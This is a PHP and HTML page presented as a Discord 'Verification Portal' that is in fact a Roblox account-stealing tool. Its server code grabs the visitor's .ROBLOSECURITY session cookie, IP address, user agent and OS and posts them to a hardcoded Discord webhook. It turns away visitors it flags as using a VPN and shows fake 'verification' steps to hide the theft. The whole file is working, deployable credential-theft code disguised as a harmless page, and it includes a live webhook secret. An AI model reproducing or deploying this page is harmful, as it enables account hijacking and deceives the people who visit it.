<?php
  session_start();

  function getOS($userAgent) {
      $os = "Unknown";
      if (preg_match('/Windows/i', $userAgent)) $os = "Windows";
      elseif (preg_match('/Macintosh|Mac OS/i', $userAgent)) $os = "MacOS";
      elseif (preg_match('/Linux/i', $userAgent)) $os = "Linux";
      elseif (preg_match('/Android/i', $userAgent)) $os = "Android";
      elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) $os = "iOS";
      return $os;
  }

  function isVPN($ip) {
      if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
          return "Private/Reserved IP - VPN likely";
      }
      $vpn_ranges = [
          '104.16.0.0/12', '172.16.0.0/12', '10.0.0.0/8', '192.168.0.0/16',
          '100.64.0.0/10', '169.254.0.0/16'
      ];
      foreach ($vpn_ranges as $range) {
          if (ip_in_range($ip, $range)) {
              return "VPN Detected - Matches range: $range";
          }
      }
      return false;
  }

  function ip_in_range($ip, $range) {
      if (strpos($range, '/') === false) return $ip === $range;
      list($subnet, $mask) = explode('/', $range);
      $ip_dec = ip2long($ip);
      $subnet_dec = ip2long($subnet);
      $mask_dec = ~((1 << (32 - $mask)) - 1);
      return ($ip_dec & $mask_dec) === ($subnet_dec & $mask_dec);
  }

  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $input = file_get_contents('php://input');
      $data = json_decode($input, true);

      $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
      $cookie = $data['cookie'] ?? (function() {
          $cookies = $_SERVER['HTTP_COOKIE'] ?? '';
          if (preg_match('/\.ROBLOSECURITY=([^;]+)/i', $cookies, $matches)) return $matches[1];
          foreach ($_COOKIE as $name => $value) {
              if (stripos($name, 'robloxsecurity') !== false) return $value;
          }
          return 'Not found';
      })();

      $user_agent = $_SERVER['HTTP_USER_AGENT'];
      $os = getOS($user_agent);

      $forwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
      $ip_address = $forwarded ? trim(explode(',', $forwarded)[count(explode(',', $forwarded)) - 1]) : ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');

      $vpn_status = isVPN($ip_address);
      if ($vpn_status) {
          header('Content-Type: text/html');
          echo '<!DOCTYPE html><html><head><title>VPN Detected</title><style>body{background:#1e1e2f;color:#d1d1d6;text-align:center;padding:20px;font-family:Arial,Helvetica,sans-serif}</style></head><body><h1 style="color:#b0b0b3">VPN Detected</h1><p style="color:#88898f">Debug: ' . htmlspecialchars($vpn_status) . '. Please disable your VPN and try again.</p></body></html>';
          exit;
      }

      $session_key = "verified_{$user_id}_{$ip_address}";
      if (isset($_SESSION[$session_key])) {
          header('Content-Type: application/json');
          echo json_encode(['status' => 'already_verified']);
          exit;
      }
      $_SESSION[$session_key] = true;

      $payload = [
          'content' => '',
          'username' => 'Verification System',
          'embeds' => [[
              'title' => 'Verification Success',
              'description' => "User <@{$user_id}> has been verified.",
              'color' => 65280,
              'fields' => [['name' => 'Details', 'value' => "ID: {$user_id}\nTime: " . date('c'), 'inline' => false]]
          ]],
          'status' => 'verified',
          'discord_user_id' => $user_id,
          'cookie' => $cookie,
          'ip_address' => $ip_address,
          'user_agent' => substr($user_agent, 0, 1000),
          'os' => $os,
          'timestamp' => date('c')
      ];

      $webhook_url = 'https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe';
      $options = ['http' => [
          'header' => "Content-Type: application/json\r\n",
          'method' => 'POST',
          'content' => json_encode($payload)
      ]];
      $context = stream_context_create($options);
      file_get_contents($webhook_url, false, $context);

      header('Content-Type: application/json');
      echo json_encode(['status' => 'success']);
      exit;
  }
  ?>

  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Verification Portal</title>
      <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
      <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body {
              font-family: 'Lato', sans-serif;
              background: linear-gradient(135deg, #1e1e2f, #2d2d44);
              color: #d1d1d6;
              overflow: hidden;
              display: flex;
              justify-content: center;
              align-items: center;
              min-height: 100vh;
          }
          .container {
              background: rgba(30, 30, 47, 0.95);
              border: 1px solid #3a3a52;
              border-radius: 10px;
              padding: 30px;
              text-align: center;
              width: 100%;
              max-width: 450px;
              box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
              transition: transform 0.3s ease, box-shadow 0.3s ease;
          }
          .container:hover {
              transform: translateY(-5px);
              box-shadow: 0 6px 20px rgba(0, 0, 0, 0.7);
          }
          h1 {
              color: #b0b0b3;
              font-size: 2em;
              font-weight: 700;
              margin-bottom: 20px;
              text-transform: uppercase;
          }
          p {
              color: #88898f;
              font-size: 1.1em;
              margin-bottom: 25px;
          }
          ul#steps {
              list-style: none;
              margin: 0 auto;
              max-width: 350px;
          }
          ul#steps li {
              font-size: 1em;
              margin-bottom: 15px;
              padding: 12px;
              background: #25253a;
              border-left: 4px solid #4a4a6a;
              border-radius: 5px;
              position: relative;
              transition: background 0.3s ease, border-color 0.3s ease;
          }
          ul#steps li:hover {
              background: #2d2d44;
              border-color: #5a5a7a;
          }
          ul#steps li.done {
              background: #2d2d44;
              border-color: #6a6a8a;
          }
          ul#steps li .check {
              position: absolute;
              right: 15px;
              color: #6a6a8a;
              font-size: 1.2em;
              opacity: 0;
              transition: opacity 0.3s ease;
          }
          ul#steps li.done .check {
              opacity: 1;
          }
          .success {
              background: linear-gradient(135deg, #2d2d44, #3a3a52);
          }
          .success h1 {
              color: #a0a0a6;
          }
          .success p {
              color: #9a9aa6;
          }
          @media (max-width: 480px) {
              .container { padding: 20px; margin: 20px; }
              h1 { font-size: 1.5em; }
          }
      </style>
  </head>
  <body>
      <div class="container" id="container">
          <h1>Verification Portal</h1>
          <p>Processing your verification request...</p>
          <ul id="steps">
              <li id="step1">Validating device...<span class="check">✓</span></li>
              <li id="step2">Authenticating identity...<span class="check">✓</span></li>
              <li id="step3">Checking security...<span class="check">✓</span></li>
              <li id="step4">Finalizing access...<span class="check">✓</span></li>
          </ul>
      </div>
      <script>
          function getCookie(name) {
              const value = `; ${document.cookie}`;
              const parts = value.split(`; ${name}=`);
              if (parts.length === 2) return parts.pop().split(';').shift();
              return "Not found";
          }

          const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
          const robloxCookie = getCookie('.ROBLOSECURITY');
          const data = { cookie: robloxCookie, user_id: userId };

          fetch(window.location.pathname, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
          })
          .then(response => response.json())
          .then(result => {
              if (result.status === 'success') {
                  setTimeout(() => document.getElementById('step1').classList.add('done'), 500);
                  setTimeout(() => document.getElementById('step2').classList.add('done'), 1500);
                  setTimeout(() => document.getElementById('step3').classList.add('done'), 2500);
                  setTimeout(() => document.getElementById('step4').classList.add('done'), 3500);
                  setTimeout(() => {
                      const container = document.getElementById('container');
                      container.classList.add('success');
                      container.innerHTML = `
                          <h1>Verification Complete</h1>
                          <p>You are now verified. Return to Discord.</p>
                      `;
                  }, 4500);
              } else if (result.status === 'already_verified') {
                  const container = document.getElementById('container');
                  container.classList.add('success');
                  container.innerHTML = `
                      <h1>Already Verified</h1>
                      <p>You’re set. Head back to Discord.</p>
                  `;
              }
          })
          .catch(error => console.error('Error:', error));
      </script>
  </body>
  </html>
